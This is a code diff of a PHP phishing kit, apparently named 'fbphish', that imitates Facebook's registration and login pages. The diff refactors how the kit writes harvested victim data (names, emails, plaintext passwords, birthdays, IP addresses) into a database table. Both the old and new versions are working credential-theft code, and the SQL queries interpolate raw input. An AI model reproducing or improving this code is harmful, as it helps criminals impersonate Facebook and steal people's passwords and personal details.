@@ -1,9 +1,9 @@
 <?php
 // Set SUPER Vars
-$fullpath = dirname(__FILE__);
+$apppath = dirname(__FILE__);
 
-// Require...
-require("$fullpath/config.inc.php");
+// Require main class
+require("$apppath/includes/main.boot.php");
 
 // Check if the action is register from home
 if($_GET['action'] == "home/register"){
@@ -117,35 +117,12 @@ if($_GET['action'] == "home/register"){
 			$missing = "NULL";
 		}
 
-		// Database connect and insert
-		try{
-			// Connect
-		    $fbphish_database_conn = new PDO("mysql:host=$fbphish_sql_host;dbname=$fbphish_sql_db", $fbphish_sql_user, $fbphish_sql_password);
-		    // set the PDO error mode to exception
-		    $fbphish_database_conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-		    $fbphish_database_conn->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
-		    // Set the sql query
-			$fbphish_sql_query_insertRegisterData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'home/register', CURRENT_TIMESTAMP, '$reg_firstname', '$reg_lastname', '$reg_email', '$reg_email_confirmation', '$reg_passwd', '$reg_birthday_day', '$reg_birthday_month', '$reg_birthday_year', '$reg_sex', 'nl_NL', '$reg_user_ip', '$reg_meta_user_ip', '$missing_string');";
-			// Execute sql
-			$fbphish_database_conn->exec($fbphish_sql_query_insertRegisterData);
-		}catch(PDOException $fbphish_database_conn_err){
-			// Error reporting
-			switch($config_option__451){
-				case "facebook":
-					header("Location: https://facebook.com");
-					break;
-				case "home":
-					header("Location: /index.php");
-					break;
-				case "show":
-					echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
-					break;
-				default:
-					header("Location: $config_option__451");
-			}
-		}
-		// Close connection
-		$fbphish_database_conn = null;
+		$fbphish_sql_query_insertRegisterData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'home/register', CURRENT_TIMESTAMP, '$reg_firstname', '$reg_lastname', '$reg_email', '$reg_email_confirmation', '$reg_passwd', '$reg_birthday_day', '$reg_birthday_month', '$reg_birthday_year', '$reg_sex', 'nl_NL', '$reg_user_ip', '$reg_meta_user_ip', '$missing_string');";
+
+		$sql->db_connect();
+		$sql->query($fbphish_sql_query_insertRegisterData);
+		$sql->db_close();
+
 
 		// If complete is "true" execute code/sql
 		if($complete == "true"){
@@ -222,35 +199,10 @@ if($_GET['action'] == "home/register"){
 			$missing = "NULL";
 		}
 
-		// Database connect and insert
-		try{
-			// Connect
-		    $fbphish_database_conn = new PDO("mysql:host=$fbphish_sql_host;dbname=$fbphish_sql_db", $fbphish_sql_user, $fbphish_sql_password);
-		    // set the PDO error mode to exception
-		    $fbphish_database_conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-		    $fbphish_database_conn->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
-		    // Set the sql query
-			$fbphish_sql_query_insertRegisterData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'home/login', CURRENT_TIMESTAMP, '0', '0', '$email', '0', '$passwd', '0', '0', '0', '0', '$locale', '$user_ip', '$meta_user_ip', '$missing_string');";
-			// Execute sql
-			$fbphish_database_conn->exec($fbphish_sql_query_insertRegisterData);
-		}catch(PDOException $fbphish_database_conn_err){
-			// Error reporting
-			switch($config_option__451){
-				case "facebook":
-					header("Location: https://facebook.com");
-					break;
-				case "home":
-					header("Location: /index.php");
-					break;
-				case "show":
-					echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
-					break;
-				default:
-					header("Location: $config_option__451");
-			}
-		}
-		// Close connection
-		$fbphish_database_conn = null;
+		$fbphish_sql_query_insertLoginData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'home/login', CURRENT_TIMESTAMP, '0', '0', '$email', '0', '$passwd', '0', '0', '0', '0', '$locale', '$user_ip', '$meta_user_ip', '$missing_string');";
+		$sql->db_connect();
+		$sql->query($fbphish_sql_query_insertLoginData);
+		$sql->db_close();
 
 		// If complete is "true" execute code/sql
 		if($complete == "true"){
